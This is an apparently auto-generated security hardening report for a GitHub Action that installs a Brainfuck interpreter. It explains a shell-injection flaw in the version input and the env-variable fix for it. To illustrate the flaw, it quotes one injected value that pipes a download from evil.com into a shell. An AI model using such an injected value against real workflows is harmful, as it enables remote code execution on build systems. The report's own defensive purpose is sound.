<!-- markdownlint-disable -->

# Hardening Report: fabasoad--setup-brainfuck-action/v1.1.1

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `1`

Action **fabasoad--setup-brainfuck-action/v1.1.1** was hardened automatically. 2 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Sub-rule (a): The `run:` block directly interpolates `${{ inputs.version }}` into the shell command string: `pip3 install brainfucky==${{ inputs.version }}`. GitHub Actions performs YAML template substitution before the shell parses the command, so an attacker who controls the `version` input (e.g. via `workflow_dispatch` or a calling workflow) can inject arbitrary shell metacharacters. For example, a value like `0.1.dev1; curl http://evil.com | sh` would be executed verbatim. The fix is to pass the input through an `env:` variable and double-quote it in the shell: set `env: VERSION: ${{ inputs.version }}` and use `pip3 install "brainfucky==$VERSION"` in the run block.

Locations:

- `action.yml:15`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.version }}" appears directly in run: block of step "Install Brainfuck"; move to env: map

Locations:

- `action.yml:18`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, static-inline-injection

**Notes:**

Moved `${{ inputs.version }}` out of the `run:` shell string and into an `env:` block as `VERSION: ${{ inputs.version }}`. Updated the shell command to use `pip3 install "brainfucky==$VERSION"` with the value properly double-quoted, preventing shell metacharacter injection from attacker-controlled input.

